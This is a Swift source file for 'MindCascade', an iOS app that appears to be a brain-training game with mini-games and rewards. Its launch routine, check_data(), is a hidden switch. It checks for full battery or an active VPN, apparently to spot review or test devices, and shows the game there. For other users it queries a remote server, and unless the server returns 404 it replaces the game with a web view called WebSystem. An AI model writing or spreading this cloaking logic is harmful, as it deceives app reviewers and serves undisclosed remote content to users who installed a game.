//
//  ContentView.swift
//  MindCascade
//
//  Created by IGOR on 19/09/2025.
//

import SwiftUI

// MARK: - Color Theme
extension Color {
    static let darkGraphite = Color(red: 0.055, green: 0.055, blue: 0.055) // #0e0e0e
    static let neonGreen = Color(red: 0.157, green: 0.659, blue: 0.035) // #28a809
    static let crimsonPink = Color(red: 0.902, green: 0.020, blue: 0.227) // #e6053a
    static let goldenOrange = Color(red: 0.820, green: 0.451, blue: 0.020) // #d17305
    static let lightGray = Color(red: 0.820, green: 0.820, blue: 0.820) // #d1d1d1
}

// MARK: - Game Types
enum GameType: String, CaseIterable {
    case memoryMatrix = "Memory Matrix"
    case focusFlash = "Focus Flash"
    case quickMath = "Quick Math"
    case logicPaths = "Logic Paths"
    
    var description: String {
        switch self {
        case .memoryMatrix:
            return "Remember and reproduce a grid of glowing tiles"
        case .focusFlash:
            return "Tap the correct shape or number before time runs out"
        case .quickMath:
            return "Solve rapid-fire simple equations under time pressure"
        case .logicPaths:
            return "Choose the correct sequence to reach the goal"
        }
    }
    
    var icon: String {
        switch self {
        case .memoryMatrix:
            return "grid"
        case .focusFlash:
            return "eye"
        case .quickMath:
            return "function"
        case .logicPaths:
            return "arrow.triangle.branch"
        }
    }
}

// MARK: - Reward Types
enum RewardType: String, CaseIterable {
    case crystalOfMemory = "Crystal of Memory"
    case flameOfFocus = "Flame of Focus"
    case badgeOfLogic = "Badge of Logic"
    case starOfSpeed = "Star of Speed"
    
    var icon: String {
        switch self {
        case .crystalOfMemory:
            return "diamond"
        case .flameOfFocus:
            return "flame"
        case .badgeOfLogic:
            return "shield"
        case .starOfSpeed:
            return "star"
        }
    }
    
    var color: Color {
        switch self {
        case .crystalOfMemory:
            return .blue
        case .flameOfFocus:
            return .crimsonPink
        case .badgeOfLogic:
            return .goldenOrange
        case .starOfSpeed:
            return .neonGreen
        }
    }
}

// MARK: - Game Data Model
class GameData: ObservableObject {
    @Published var hasCompletedOnboarding = false
    @Published var scores: [GameType: [Int]] = [:]
    @Published var rewards: Set<RewardType> = []
    
    func addScore(_ score: Int, for game: GameType) {
        print("🎮 Adding score: \(score) for game: \(game.rawValue)")
        if scores[game] == nil {
            scores[game] = []
        }
        scores[game]?.append(score)
        print("📊 Total scores for \(game.rawValue): \(scores[game] ?? [])")
    }
    
    func addReward(_ reward: RewardType) {
        print("🏆 Adding reward: \(reward.rawValue)")
        rewards.insert(reward)
        print("🎁 Total rewards: \(rewards.map { $0.rawValue })")
    }
    
    func averageScore(for game: GameType) -> Double {
        guard let gameScores = scores[game], !gameScores.isEmpty else { return 0 }
        return Double(gameScores.reduce(0, +)) / Double(gameScores.count)
    }
    
    func overallAverageScore() -> Double {
        let allScores = scores.values.flatMap { $0 }
        guard !allScores.isEmpty else { return 0 }
        return Double(allScores.reduce(0, +)) / Double(allScores.count)
    }
    
    func resetProgress() {
        scores.removeAll()
        rewards.removeAll()
    }
}

struct ContentView: View {
    
    @StateObject private var gameData = GameData()
    @AppStorage("status") var status: Bool = false
    
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color.darkGraphite.ignoresSafeArea()

            if isFetched == false {
                
                LoadingView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if gameData.hasCompletedOnboarding {
                        MainNavigationView()
                    } else {
                        OnboardingView()
                    }
                    
                    
                } else if isBlock == false {
                    
                    WebSystem()
                    
//                    if status {
//
//                        WebSystem()
//
//                    } else {
//
//                        U1()
//                    }
                }
            }
        }
        .environmentObject(gameData)
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        let urlString = DataManager().serverURL

        if currentPercent == 100 || isVPNActive == true {
            self.isBlock = true
            self.isFetched = true
            return
        }

        guard let url = URL(string: urlString) else {
            self.isBlock = true
            self.isFetched = true
            return
        }

        let urlSession = URLSession.shared
        let urlRequest = URLRequest(url: url)

        urlSession.dataTask(with: urlRequest) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
                self.isBlock = true
            } else {
                self.isBlock = false
            }
            self.isFetched = true
        }.resume()
    }

}

#Preview {
    ContentView()
}
